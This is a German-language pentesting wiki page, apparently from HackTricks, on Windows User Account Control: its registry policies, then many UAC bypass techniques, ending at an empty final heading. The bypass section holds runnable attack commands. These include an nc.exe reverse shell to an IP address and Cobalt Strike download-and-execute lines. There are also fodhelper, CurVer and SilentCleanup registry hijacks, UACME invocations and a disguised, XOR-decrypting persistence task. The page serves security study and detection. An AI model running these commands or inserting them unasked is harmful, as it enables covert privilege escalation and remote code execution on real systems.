# UAC – Benutzerkontensteuerung

{{#include ../../banners/hacktricks-training.md}}

## UAC

[Die Benutzerkontensteuerung (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ist eine Funktion, die bei **Aktivitäten mit erhöhten Rechten eine Zustimmungsaufforderung** anzeigt. Anwendungen haben unterschiedliche `integrity`-Stufen. Ein Programm mit einer **hohen Stufe** kann Aufgaben ausführen, die **das System potenziell gefährden könnten**. Wenn UAC aktiviert ist, werden Anwendungen und Aufgaben immer **im Sicherheitskontext eines Nicht-Administratorkontos ausgeführt**, sofern ein Administrator diesen Anwendungen/Aufgaben nicht ausdrücklich Administratorzugriff auf das System gewährt. Diese Komfortfunktion schützt Administratoren vor unbeabsichtigten Änderungen, gilt jedoch nicht als Sicherheitsgrenze.<sup>[[2]](#references)</sup>

Weitere Informationen zu Integritätsstufen:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Wenn UAC aktiviert ist, erhält ein Administratorbenutzer zwei Tokens: ein Standardbenutzer-Token für normale Aktionen mit mittlerer Integrität und ein Token mit Administratorrechten.

Diese [Seite](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) erläutert ausführlich die Funktionsweise von UAC und umfasst den Anmeldeprozess, die Benutzererfahrung und die UAC-Architektur.<sup>[[2]](#references)</sup> Administratoren können Sicherheitsrichtlinien verwenden, um die Funktionsweise von UAC für ihre Organisation lokal (mit secpol.msc) zu konfigurieren oder sie in einer Active-Directory-Domänenumgebung über Gruppenrichtlinienobjekte (GPOs) zu konfigurieren und bereitzustellen. Die verschiedenen Einstellungen werden [hier](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) ausführlich erläutert. Für UAC können 10 Gruppenrichtlinieneinstellungen festgelegt werden. Die folgende Tabelle enthält weitere Details:

| Gruppenrichtlinieneinstellung                                                                                                                                                                                                                                                                                                                                                           | Registrierungsschlüssel                | Standardeinstellung                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [Benutzerkontensteuerung: Administratorgenehmigungsmodus für das integrierte Administratorkonto](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Deaktiviert)                                             |
| [Benutzerkontensteuerung: Verhalten der Eingabeaufforderung zur Erhöhung von Berechtigungen für Administratoren im Administratorgenehmigungsmodus](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Zustimmungsaufforderung für Nicht-Windows-Binärdateien auf dem sicheren Desktop) |
| [Benutzerkontensteuerung: Verhalten der Eingabeaufforderung zur Erhöhung von Berechtigungen für Standardbenutzer](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Anmeldeinformationsabfrage auf dem sicheren Desktop)         |
| [Benutzerkontensteuerung: Anwendungsinstallationen erkennen und zur Erhöhung von Berechtigungen auffordern](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Aktiviert; in Enterprise standardmäßig deaktiviert)           |
| [Benutzerkontensteuerung: Nur signierte und überprüfte ausführbare Dateien mit erhöhten Berechtigungen ausführen](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Deaktiviert)                                             |
| [Benutzerkontensteuerung: UIAccess-Anwendungen nur dann mit erhöhten Berechtigungen ausführen, wenn sie an sicheren Speicherorten installiert sind](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Aktiviert)                                              |
| [Benutzerkontensteuerung: Alle Administratoren im Administratorgenehmigungsmodus ausführen](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Aktiviert)                                              |
| [Benutzerkontensteuerung: UIAccess-Anwendungen erlauben, ohne den sicheren Desktop zur Erhöhung von Berechtigungen aufzufordern](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Deaktiviert)                                             |
| [Benutzerkontensteuerung: Bei Aufforderung zur Erhöhung von Berechtigungen zum sicheren Desktop wechseln](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Aktiviert)                                              |
| [Benutzerkontensteuerung: Fehler beim Schreiben von Dateien und Registrierungseinträgen in benutzerspezifische Speicherorte virtualisieren](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Aktiviert)                                              |

### Richtlinien für die Installation von Software unter Windows

Die **lokalen Sicherheitsrichtlinien** (auf den meisten Systemen „secpol.msc“) sind standardmäßig so konfiguriert, dass **Nicht-Administratoren keine Software installieren können**. Das bedeutet: Auch wenn ein Nicht-Administrator das Installationsprogramm für Ihre Software herunterladen kann, kann er es ohne ein Administratorkonto nicht ausführen.

### Registrierungsschlüssel, die UAC zur Abfrage einer Berechtigungserhöhung zwingen

Als Standardbenutzer ohne Administratorrechte können Sie sicherstellen, dass das „Standard“-Konto von **UAC zur Eingabe von Anmeldeinformationen aufgefordert wird**, wenn es bestimmte Aktionen auszuführen versucht. Dazu müssen bestimmte **Registrierungsschlüssel** geändert werden. Dafür sind Administratorrechte erforderlich, es sei denn, es gibt einen **UAC bypass** oder der Angreifer ist bereits als Administrator angemeldet.

Auch wenn der Benutzer zur Gruppe **Administratoren** gehört, zwingen diese Änderungen den Benutzer dazu, **seine Anmeldeinformationen erneut einzugeben**, um administrative Aktionen auszuführen.

**In der Praxis ist dies nur nützlich, wenn bereits ein Token mit erhöhten Rechten, ein UAC bypass oder eine Fehlkonfiguration vorliegt, durch die sich diese Schlüssel ändern lassen. Andernfalls wird der Schreibzugriff auf die Registrierung selbst blockiert.**

Die folgenden Registrierungsschlüssel und Einträge müssen geändert werden (Standardwerte in Klammern):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
  - `ConsentPromptBehaviorUser` = 1 (3)
  - `ConsentPromptBehaviorAdmin` = 1 (5)
  - `PromptOnSecureDesktop` = 1 (1)

Dies kann auch manuell über das Tool „Lokale Sicherheitsrichtlinie“ erfolgen. Nach der Änderung werden Benutzer bei administrativen Vorgängen aufgefordert, ihre Anmeldeinformationen erneut einzugeben.

### Hinweis

**Die Benutzerkontensteuerung ist keine Sicherheitsgrenze.** Standardbenutzer können daher ihre Konten nicht verlassen und Administratorrechte erlangen, ohne einen lokalen Privilegienausweitungs-Exploit zu verwenden.

### Einen Benutzer um „vollen Zugriff auf den Computer“ bitten

```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```

### UAC-Berechtigungen

- Der geschützte Modus von Internet Explorer verwendet Integritätsprüfungen, um zu verhindern, dass Prozesse mit hoher Integritätsstufe (wie Webbrowser) auf Daten mit niedriger Integritätsstufe (wie den Ordner für temporäre Internetdateien) zugreifen. Dazu wird der Browser mit einem Token niedriger Integritätsstufe ausgeführt. Wenn der Browser versucht, auf Daten in der Zone niedriger Integritätsstufe zuzugreifen, prüft das Betriebssystem die Integritätsstufe des Prozesses und gewährt den Zugriff entsprechend. Diese Funktion hilft, zu verhindern, dass Remote-Code-Ausführungsangriffe Zugriff auf sensible Daten des Systems erhalten.
- Wenn sich ein Benutzer bei Windows anmeldet, erstellt das System ein Zugriffstoken, das eine Liste der Berechtigungen des Benutzers enthält. Berechtigungen sind die Kombination aus Benutzerrechten und Fähigkeiten. Das Token enthält außerdem eine Liste der Anmeldedaten des Benutzers, die zur Authentifizierung des Benutzers am Computer und bei Ressourcen im Netzwerk verwendet werden.

### Autoadminlogon

Um Windows so zu konfigurieren, dass beim Start automatisch ein bestimmter Benutzer angemeldet wird, legen Sie den **Registrierungsschlüssel `AutoAdminLogon`** fest. Das ist für Kiosk-Umgebungen oder zu Testzwecken nützlich. Verwenden Sie dies nur auf sicheren Systemen, da das Kennwort dadurch in der Registrierung offengelegt wird.

Legen Sie die folgenden Schlüssel mit dem Registrierungs-Editor oder `reg add` fest:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
  - `AutoAdminLogon` = 1
  - `DefaultUsername` = username
  - `DefaultPassword` = password

Um zum normalen Anmeldeverhalten zurückzukehren, setzen Sie `AutoAdminLogon` auf 0.

## UAC bypass

> [!TIP]
> Beachten Sie, dass der UAC bypass unkompliziert ist, wenn Sie grafischen Zugriff auf das Opfer haben: Sie können einfach auf „Ja“ klicken, sobald die UAC-Abfrage erscheint.

Der UAC bypass ist in folgender Situation erforderlich: **UAC ist aktiviert, Ihr Prozess läuft in einem Kontext mittlerer Integrität und Ihr Benutzer gehört zur Administratorengruppe**.

Es ist wichtig zu erwähnen, dass sich UAC **viel schwerer umgehen lässt, wenn die höchste Sicherheitsstufe (Always) eingestellt ist, als bei einer der anderen Stufen (Default).**

### Schnelle Ersteinschätzung über eine Shell mit mittlerer Integrität

Bevor Sie einen Bypass versuchen, vergewissern Sie sich, dass die Situation passt, und ordnen Sie den Host-Build bekannten funktionierenden Methoden zu:

```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```

Praktische Hinweise:
- Wenn `EnableLUA=0` ist, brauchst du keinen Bypass: Jedes Admin-Token kann direkt hohe Integrität anfordern.
- `ConsentPromptBehaviorAdmin=2` oder `5` ist das häufigste Szenario für auto-elevate- / COM-basierte Bypasses.
- `Always Notify` erhöht die Hürde, aber du solltest trotzdem den genauen Build testen, statt von einem Fehlschlag auszugehen: UACME erfasst weiterhin einige mit `Always Notify` kompatible Methoden auf modernen Windows-Builds.<sup>[[3]](#references)</sup>

### UAC deaktiviert

Wenn UAC bereits deaktiviert ist (`ConsentPromptBehaviorAdmin` ist **`0`**), kannst du **eine Reverse Shell mit Admin-Rechten** (hohes Integritätslevel) ausführen, etwa so:

```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```

#### UAC-Umgehung mit Token-Duplizierung

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### Local RPC + wiederverwendbares Debug-Objekt

Die lokale AppInfo-RPC-Schnittstelle `201ef99a-7fa0-444c-9399-19ba84f12a1a` kann einen Prozess mit aktiviertem Debugging erstellen. Prozesse, die auf demselben Thread durch Debugging erstellt werden, verwenden dasselbe Debug-Objekt des Threads; ein Erstellungs-Debug-Ereignis enthält ein Prozess-Handle mit Vollzugriff, selbst wenn das RPC-Ergebnis selbst nur eingeschränkten Zugriff gewährt. Dadurch wird die Wiederverwendung eines Debug-Objekts zu einer UAC-Primitive für ein Mitglied der Gruppe Administrators mit mittlerer Integritätsstufe.<sup>[[11]](#references)[[12]](#references)</sup>

Eine praktische Angriffskette ist:<sup>[[11]](#references)[[12]](#references)</sup>

1. Rufe die lokale RPC-Methode auf (direkt oder über `NdrAsyncClientCall`), um einen nicht erhöhten Wegwerfprozess mit aktiviertem Debugging zu erstellen.
2. Frage `ProcessDebugObjectHandle` mit `NtQueryInformationProcess` ab, trenne das Debug-Objekt mit `NtRemoveProcessDebug` ab, behalte das Objekt und beende den Wegwerfprozess.
3. Verwende dieselbe RPC-Schnittstelle, um einen vertrauenswürdigen, automatisch erhöhten Prozess zu erstellen, und verknüpfe dann das gespeicherte Objekt über `DbgUiSetThreadDebugObject` mit dem aufrufenden Thread.
4. Rufe `WaitForDebugEvent` auf und übernimm das Prozess-Handle aus dem `CREATE_PROCESS_DEBUG_EVENT`; dupliziere es vor dem Fortsetzen mit `NtDuplicateObject`.
5. Übergib das duplizierte Handle an `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)` und starte die Payload mit einer erweiterten Startinformationsstruktur. Dadurch wird sowohl der Kontext des erhöhten Prozesses wiederverwendet als auch dem Kindprozess eine vertrauenswürdig wirkende übergeordnete Prozessbeziehung gegeben.

Suche nach der kurzen Sequenz und nicht nur nach der automatisch erhöhten Binärdatei: lokale AppInfo-RPC-Prozesserstellung, Abfragen von `ProcessDebugObjectHandle`, Trennen und erneutes Verknüpfen des Debuggers, ein unmittelbar folgendes Erstellungs-Debug-Ereignis, Handle-Duplizierung und ein Kindprozess, dessen aufgezeichneter übergeordneter Prozess nicht mit dem Prozess übereinstimmt, der die Erstellungs-APIs aufgerufen hat.<sup>[[12]](#references)</sup>

### **Sehr** einfacher UAC-„Bypass“ (vollständiger Zugriff auf das Dateisystem)

Wenn du eine Shell mit einem Benutzer hast, der zur Gruppe Administrators gehört, kannst du die über SMB freigegebene **C$-Freigabe** (Dateisystem) lokal auf einem neuen Laufwerk einbinden und erhältst **Zugriff auf alles im Dateisystem** (sogar auf den Home-Ordner des Administrators).

> [!WARNING]
> **Sieht so aus, als würde dieser Trick nicht mehr funktionieren**

```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```

### UAC-Bypass mit Cobalt Strike

Die Cobalt-Strike-Techniken funktionieren nur, wenn UAC nicht auf die höchste Sicherheitsstufe eingestellt ist.

```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```

**Empire** und **Metasploit** verfügen ebenfalls über mehrere Module zum **Bypass** von **UAC**.

### Erhöhte COM-Schnittstellen (`ICMLuaUtil` / `CMSTPLUA`)

Auto-elevated COM-Objekte sind auch auf modernen Builds eine praktische UAC-Angriffsfläche. `ICMLuaUtil` wird von UACME weiterhin als funktionierend auf aktuellen Windows-Versionen geführt, und offensive Tools passen `CMSTPLUA` laufend an, indem sie einen interaktiven Desktop-Prozess, 64-Bit-Ausführung und manchmal PEB-/Prozess-Masquerading kombinieren, bevor sie den COM Elevation Moniker aufrufen.<sup>[[3]](#references)</sup>

Praktische Tipps:
- Bevorzuge einen **64-Bit**-Prozess in der **interaktiven Sitzung** des Benutzers (üblicherweise `explorer.exe` oder einen seiner untergeordneten Prozesse).
- Wenn eine rohe Shell fehlschlägt, versuche es stattdessen mit einer BOF-/UACME-Implementierung und nicht mit einem naiven `CreateProcess`-Wrapper.
- Rechne damit, dass die Ausführung des untergeordneten Prozesses in einem **separaten Prozess mit erhöhten Rechten** erfolgt; viele BOFs erhöhen nicht die Rechte des aktuellen Beacons direkt.

### KRBUACBypass

Dokumentation und Tool unter [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC-Bypass-Exploits

[**UACME**](https://github.com/hfiref0x/UACME) ist eine Sammlung von UAC-Bypass-Techniken. Kompiliere es mit Visual Studio oder MSBuild; beim Build werden mehrere ausführbare Dateien erstellt (zum Beispiel `Source\Akagi\output\x64\Debug\Akagi.exe`), wähle also die für den Ziel-Build geeignete Methode aus.<sup>[[3]](#references)</sup>\
Sei vorsichtig: Einige Bypässe starten sichtbare Programme oder Eingabeaufforderungen, die den Benutzer alarmieren können.<sup>[[3]](#references)</sup>

UACME gibt die **Build-Version an, ab der die jeweilige Technik funktioniert**.<sup>[[3]](#references)</sup> Du kannst nach einer Technik suchen, die deine Versionen betrifft:

```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

Außerdem erhältst du mithilfe von [this](https://en.wikipedia.org/wiki/Windows_10_version_history) anhand der Build-Versionen die Windows-Version `1607`.

Ein praktischer Ablauf besteht darin, zuerst den Build des Hosts zu **bewerten** und erst danach die passende Methode anzuwenden:

```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```

- `WinPwnage` vergleicht den lokalen Build schnell mit seinen bekannten UAC-Methoden. So lassen sich veraltete PoCs schnell aussortieren.<sup>[[4]](#references)</sup>
- `UACME` ist weiterhin der beste öffentliche Katalog, um einen Bypass einem präzisen Build zuzuordnen. Version 3.7.1 fügte die Methoden 83–85 hinzu, während die vorherige Version bestehende Methoden erneut unter **Windows 11 25H2** testete. Prüfe die Methodentabelle und die Release Notes erneut, statt anzunehmen, dass ein alter PoC unverändert funktioniert.<sup>[[3]](#references)[[9]](#references)</sup>

### WNF/UIAccess-Ketten mit Always Notify (UACME 3.7.1)

`Always Notify` verhindert nicht jeden UAC bypass. UACME 3.7.1 implementiert drei neue x64-Methoden, die benutzergesteuerten Umgebungs-/Protokollstatus mit dem Verhalten erhöhter geplanter Tasks oder von UIAccess kombinieren, und kennzeichnet sie alle als `AlwaysNotify compatible`:<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** `SystemRoot` umleiten, damit der durch WNF ausgelöste `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask` das erhöhte `taskhostw.exe` dazu bringt, `unifiedconsent.dll` per side-load zu laden. UACME führt die Methode ab Windows 10 Build 19041 auf.
- **84 — TabTip:** Dasselbe Umgebungsvariablen-Primitiv auf UIAccess-`TabTip.exe` anwenden. Je nach Build lädt diese `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll` oder `rsaenh.dll`. Anschließend aus dem resultierenden UIAccess-Kontext mit hoher Integrität weiter pivotieren. UACME führt die Methode ab Windows 8.1 / Server 2016 auf.
- **85 — Narrator:** Das benutzerspezifische Protokoll `feedback-hub` kapern, Narrator mit `Alt+CapsLock+F` steuern und dann eine beschreibbare Kopie von `osk.exe` starten, die `OskSupport.dll` per side-load lädt. Dafür ist ein interaktiver Desktop erforderlich. UACME führt die Methode ab Windows 10 1809 / Server 2019 auf.

Nachdem du die Payload-Einheiten und Akagi wie von UACME dokumentiert erstellt hast, rufe die passende Methodennummer auf (der optionale Befehl ist standardmäßig `cmd.exe`):

```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```

Methoden 84 und 85 sind auf UIAccess/Desktop-Interaktion angewiesen. Daher ist nicht zu erwarten, dass sie unverändert aus Session 0 oder einer nicht interaktiven Service-Shell funktionieren. Alle drei manipulieren Umgebungs-/Protokollstatus und legen DLLs ab. Prüfen Sie die Implementierung und entfernen Sie diese Artefakte nach dem Testen.<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Die vertrauenswürdige Binärdatei `fodhelper.exe` wird auf modernen Windows-Systemen automatisch mit erhöhten Rechten ausgeführt. Beim Start fragt sie den folgenden benutzerspezifischen Registry-Pfad ab, ohne den Verb `DelegateExecute` zu validieren. Wenn dort ein Befehl platziert wird, kann ein Prozess mit Medium Integrity (dessen Benutzer Mitglied der Administratoren ist) ohne UAC-Eingabeaufforderung einen Prozess mit High Integrity starten.

Vom fodhelper abgefragter Registry-Pfad:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```

<details>
<summary>PowerShell-Schritte (Payload festlegen, dann auslösen)</summary>

```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```

</details>
Hinweise:
- Funktioniert, wenn der aktuelle Benutzer Mitglied der Administratoren ist und die UAC-Stufe auf Standard/locker eingestellt ist (nicht auf „Immer benachrichtigen“ mit zusätzlichen Einschränkungen).
- Verwende den Pfad `sysnative`, um auf 64-Bit-Windows aus einem 32-Bit-Prozess eine 64-Bit-PowerShell zu starten.
- Die Payload kann ein beliebiger Befehl sein (PowerShell, cmd oder ein EXE-Pfad). Vermeide für mehr Tarnung Eingabeaufforderungen.

#### `ComputerDefaults.exe`-Trigger für denselben `ms-settings`-Handler

`ComputerDefaults.exe` löst dieselbe benutzerspezifische `ms-settings\Shell\Open\command`-Zuordnung auf wie `fodhelper.exe`.<sup>[[13]](#references)[[14]](#references)</sup> Nachdem du den Standardbefehl und den leeren Wert `DelegateExecute` wie oben festgelegt hast, verwende alternativ `Start-Process "$env:WINDIR\System32\ComputerDefaults.exe"` als Trigger; wiederhole die Registrierungseinrichtung nicht.<sup>[[13]](#references)[[14]](#references)</sup> Die Voraussetzungen für den Administrator mit mittlerer Integrität und die UAC-Richtlinie aus den obigen Hinweisen zu `fodhelper.exe` gelten weiterhin.<sup>[[2]](#references)[[3]](#references)</sup> UACME führt diesen Trigger ab Windows 10 RS4 (Build 17134) auf. Überprüfe ihn daher auf dem Ziel-Build.<sup>[[3]](#references)</sup>

#### CurVer-/Erweiterungs-Hijack-Variante (nur HKCU)

Aktuelle Samples, die `fodhelper.exe` missbrauchen, vermeiden `DelegateExecute` und leiten stattdessen die `ms-settings`-ProgID über den benutzerspezifischen `CurVer`-Wert **um**. Die automatisch erhöhte Binärdatei löst den Handler weiterhin unter `HKCU` auf, daher ist kein Admin-Token nötig, um die Schlüssel anzulegen:<sup>[[5]](#references)</sup>

```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```

Nach der Rechteausweitung **deaktiviert** Malware häufig **zukünftige Eingabeaufforderungen**, indem sie `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` auf `0` setzt. Anschließend führt sie weitere defense evasion durch (z. B. `Add-MpPreference -ExclusionPath C:\ProgramData`) und richtet die Persistenz erneut ein, damit sie mit hoher Integrität ausgeführt wird. Eine typische Persistenzaufgabe speichert ein **XOR-verschlüsseltes PowerShell-Skript** auf dem Datenträger und entschlüsselt und führt es stündlich im Arbeitsspeicher aus:<sup>[[5]](#references)</sup>

```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```

Diese Variante entfernt weiterhin den Dropper und lässt nur die gestagten Payloads zurück. Dadurch muss die Erkennung auf die Überwachung des **`CurVer`-Hijacks**, der Manipulation von `ConsentPromptBehaviorAdmin`, der Erstellung von Defender-Ausnahmen oder von geplanten Tasks setzen, die PowerShell im Arbeitsspeicher entschlüsseln.<sup>[[5]](#references)</sup>

### UAC-Bypass über den Task `SilentCleanup` (`HKCU\Environment\windir`)

`SilentCleanup` startet `cleanmgr.exe` mit höchsten Privilegien und expandiert `%windir%` aus der Benutzerumgebung. Wenn du `HKCU\Environment\windir` kontrollierst, kannst du diese Expansion auf einen beliebigen Befehl umleiten und so ohne Zustimmungsdialog hohe Integrität erlangen.<sup>[[8]](#references)</sup> Es lohnt sich weiterhin, diese Methode auf aktuellen Builds zu testen, da UACME die Technik weiterhin aktiv hält und die Nachverfolgung aktueller Probleme darauf hindeutet, dass Windows 11 24H2 möglicherweise nur geringfügige Anpassungen an der Quotierung erfordert.<sup>[[3]](#references)</sup>

```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```

Wenn die Aufgabe auf diesem Build den Pfad in Anführungszeichen setzt, wiederhole den Versuch mit einem Payload, der mit einem Anführungszeichen endet (zum Beispiel `cmd.exe"`). Bereinige nach dem Test immer `HKCU\Environment\windir`.

#### Weitere UAC-Bypasses

Viele klassische UAC-Bypasses, die UI-Abläufe, COM-Objekte oder Desktop-Interaktion ausnutzen, erfordern eine **vollständige interaktive Sitzung** mit dem Opfer; eine gewöhnliche `nc.exe`-Shell oder ein Dienst, der in **Session 0** läuft, reicht oft nicht aus.

Das lässt sich häufig mit einer **meterpreter**-Sitzung lösen. Migriere zu einem **Prozess**, bei dem der Wert von **Session** gleich **1** ist:

![ms-settings auf eine benutzerdefinierte Erweiterung (.thm) zeigen lassen und diese Erweiterung unserem Payload zuordnen – Weitere UAC-Bypasses: Das lässt sich mit einer meterpreter-Sitzung erreichen. Migriere zu einem Prozess, bei dem Session...](<../../images/image (863).png>)

(_explorer.exe_ sollte funktionieren)

### UAC-Bypass mit GUI

Wenn du Zugriff auf eine **GUI hast, kannst du die UAC-Abfrage einfach bestätigen**, sobald sie erscheint; einen technischen Bypass brauchst du dann nicht wirklich. Daher reicht eine GUI-Sitzung oft aus, um die praktischen Einschränkungen durch UAC zu umgehen.

Außerdem gibt es in einer GUI-Sitzung, die jemand verwendet hat (möglicherweise über RDP), **einige Tools, die als Administrator ausgeführt werden** und über die du zum Beispiel direkt eine **cmd** **als Admin ausführen** kannst, ohne erneut von UAC dazu aufgefordert zu werden, etwa [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Das könnte etwas **stealthier** sein.

### Lauter UAC-Brute-Force-Bypass

